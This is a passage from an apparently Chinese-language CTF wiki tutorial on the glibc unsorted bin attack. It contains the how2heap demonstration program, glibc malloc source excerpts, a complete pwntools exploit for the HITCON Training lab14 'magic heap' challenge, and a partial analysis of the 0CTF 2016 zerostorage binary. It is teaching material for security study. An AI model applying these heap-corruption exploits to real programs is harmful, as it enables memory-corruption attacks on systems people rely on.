\u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002 \u57fa\u672c\u4f7f\u7528\u60c5\u51b5 \u00b6 Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002 \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4ee5 shellphish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 unsorted_bin_attack.c \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a \u279c unsorted_bin_attack git: ( master ) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git: ( master ) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let 's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002 \u521d\u59cb\u72b6\u6001\u65f6 unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002 \u6267\u884cfree(p) \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002 \u4fee\u6539p[1] \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002 \u7533\u8bf7400\u5927\u5c0f\u7684chunk \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002 while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); victim = unsorted_chunks(av)->bk=p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002 \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002 We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 ( in 32 -bits machine, it should be target address-8 ) :0x7ffe0d232508 Let ' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4 \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002 HITCON Training lab14 magic heap \u00b6 \u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002 void l33t () { system ( \"cat ./flag\" ); } \u57fa\u672c\u4fe1\u606f \u00b6 \u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd \u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002 \u5229\u7528 \u00b6 \u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002 \u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002 \u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a &magic-16\u3002 \u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002 \u4ee3\u7801\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './magicheap' ) def create_heap ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit_heap ( idx , size , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def del_heap ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) create_heap ( 0x20 , \"dada\" ) # 0 create_heap ( 0x80 , \"dada\" ) # 1 # in order not to merge into top chunk create_heap ( 0x20 , \"dada\" ) # 2 del_heap ( 1 ) magic = 0x6020c0 fd = 0 bk = magic - 0x10 edit_heap ( 0 , 0x20 + 0x20 , \"a\" * 0x20 + p64 ( 0 ) + p64 ( 0x91 ) + p64 ( fd ) + p64 ( bk )) create_heap ( 0x80 , \"dada\" ) #trigger unsorted bin attack r . recvuntil ( \":\" ) r . sendline ( \"4869\" ) r . interactive () 2016 0CTF zerostorage-\u5f85\u5b8c\u6210 \u00b6 \u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002 \u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002 \u5b89\u5168\u6027\u68c0\u67e5 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4 pwndbg> checksec [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled \u57fa\u672c\u529f\u80fd\u5206\u6790 \u00b6 \u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b 00000000 Storage struc ; (sizeof=0x18, mappedto_7) 00000000 ; XREF: .bss:storage_list/r 00000000 use dq ? 00000008 size dq ? 00000010 xor_addr dq ? 00000018 Storage ends insert-1 \u00b6 \u57fa\u672c\u529f\u80fd\u5982\u4e0b \u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002 \u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002 \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002 \u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002 \u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002 \u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002 \u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01 \u9012\u589e storage num\u7684\u6570\u91cf\u3002 update-2 \u00b6 \u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6 \u66f4\u65b0\u540e storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002 \u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b \u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b \u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b \u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002 \u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c \u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002 \u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002 merge-3 \u00b6 \u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002 \u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002 \u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002 \u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c \u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4 \uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002 \u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002 \u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002 delete-4 \u00b6 \u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c storage \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002 \u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002 view-5 \u00b6 \u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c storage \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002 \u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002 list-6 \u00b6 \u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002 \u6f0f\u6d1e\u786e\u5b9a \u00b6 \u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002 \u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage 